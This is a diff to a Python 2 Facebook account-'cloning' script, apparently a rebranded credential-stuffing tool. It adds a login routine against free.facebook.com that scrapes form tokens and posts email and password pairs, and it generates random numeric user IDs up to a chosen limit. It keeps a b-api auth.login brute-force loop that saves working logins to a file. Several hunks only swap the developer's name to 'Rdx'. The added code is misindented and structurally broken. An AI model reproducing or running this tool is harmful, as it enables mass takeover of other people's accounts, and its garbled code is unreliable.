@@ -38,6 +38,17 @@ sys.setdefaultencoding('utf8')
 br = mechanize.Browser()
 br.set_handle_robots(False)
 br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
+free_fb = session.get('https://free.facebook.com').text
+            log_data = {
+                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
+            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
+            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
+            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
+            "try_number":"0",
+            "unrecognized_tries":"0",
+            "email":uid,
+            "pass":ps,
+            "login":"Log In"}
 br.addheader_freefb = {"authority": 'free.facebook.com',
             "method": 'GET',
             "scheme": 'https',
@@ -76,6 +87,8 @@ br.addheader_freefb = {"authority": 'free.facebook.com',
             "priority": 'u=0',
             'cross-origin-resource-policy': 'cross-origin',
             "upgrade-insecure-requests": '1'}
+            lo = session.post('https://free.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
+            log_cookies=session.cookies.get_dict().keys()
 def keluar():
 	print 'Rdx '
 	os.sys.exit()
@@ -10626,6 +10639,8 @@ reactiongroup = []
 comment = []
 group_comment = []
 listgroup = []
+ugen2=[]
+ugen=[]
 vulnot = "\033[31mNot Vuln"
 vuln = "\033[32mVuln"
 
@@ -10669,6 +10684,14 @@ while (loop == 'true'):
         print "\033[1;97mWrong Username"
         os.system('xdg-open https://www.youtube.com/channel/UCih_lYasMeHMbEHYVzduhug')
 
+	print("")
+    limit = int(input(' EXAMPLE: 2000, 3000, 50000, 100000\n\n PUT CLONING LIMIT: '))
+    for nmbr in range(limit):
+        nmp = ''.join(random.choice(string.digits) for _ in range(7))
+        user.append(nmp)
+    os.system("clear")
+    
+    
 ##### LICENSE #####
 #=================#
 def lisensi():
@@ -11270,7 +11293,7 @@ def pilih_crack():
 		os.system('clear')
 		print logo
 		jjt = raw_input("\033[1;97m[+] \033[1;97mEnter ID\033[1;97m: \033[1;97m")
-		print "\033[1;97m«-----------------\033[1;97mTech-Aahil\033[1;97m---------------»"
+		print "\033[1;97m«-----------------\033[1;97mRdx\033[1;97m---------------»"
 		try:
 			m = requests.get("https://graph.facebook.com/"+jjt+"?access_token="+toket)
 			td = json.loads(m.text)
@@ -11328,7 +11351,7 @@ def pilih_crack():
 		try:
 			os.mkdir('cookie')
 		except OSError:
-			pass #Dev:love_hacker
+			pass #Dev:Rdx
 		try:
 			k = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
 			y = json.loads(k.text)
@@ -12349,7 +12372,7 @@ def pilih_super():
 		try:
 			os.mkdir('out')
 		except OSError:
-			pass#Dev:Tech-Aahil
+			pass#Dev:Rdx
 		try:
 			g = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
 			l = json.loads(a.text)
@@ -13139,7 +13162,7 @@ def pilih_isi():
 	print "\n\033[1;97m«-----\x1b[1;91m【To Stop Process Press CTRL+Z】\033[1;97m----»"
 	print "\033[1;97m«--------------------\033[1;97m▣\033[1;97m--------------------»"
 	jalan(' \033[1;97mPlz Wait Cloned Accounts Will Appear Here')
-        jalan(' \033[1;97m          Start Cloning Black Mafia')
+        jalan(' \033[1;97m          Start Cloning Rdx')
 	print "\033[1;97m«--------------------\033[1;97m▣\033[1;97m--------------------»"
 	
 			
@@ -13253,6 +13276,14 @@ def pilih_isi():
 																	cek.close()
 																	cekpoint.append(user+pass7)
 																	
+																    break
+            else:
+                continue
+        loop+=1
+        sys.stdout.write(' %s[Ⓡ1F4Ⓣ] [%s/%s]  OK:- %s  CP:- %s \r'%(H,loop,tl,len(oks),len(cps))),
+        sys.stdout.flush()
+    except:
+        pass
 															
 		except:
 			pass
@@ -14606,6 +14637,9 @@ def action():
 			pass1 = user
 			data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
 			q = json.load(data)
+        loop+=1
+        sys.stdout.write(' %s[ⓇDX] [%s/%s]  OK:- %s  CP:- %s \r'%(H,loop,tl,len(oks),len(cps))),
+        sys.stdout.flush()
 			if 'access_token' in q:
 				print '\x1b[1;92m[ⓇDX-OK]\x1b[0m ' + k + c + user + ' -•◈•- ' + pass1+'\n'+"\n"
 				okb = open('save/successfull.txt', 'a')
@@ -14636,7 +14670,13 @@ def action():
 #					        cps.write(k+c+user+'-•◈•-'+pass2+'\n')
 #					        cps.close()
 #					        cpb.append(c+user+pass2)
-																	
+							   break
+            else:
+                continue
+        loop+=1
+        sys.stdout.write(' %s[ⓇDX] [%s/%s]  OK:- %s  CP:- %s \r'%(H,loop,tl,len(oks),len(cps))),
+        sys.stdout.flush()
+							
 															
 		except:
 			pass
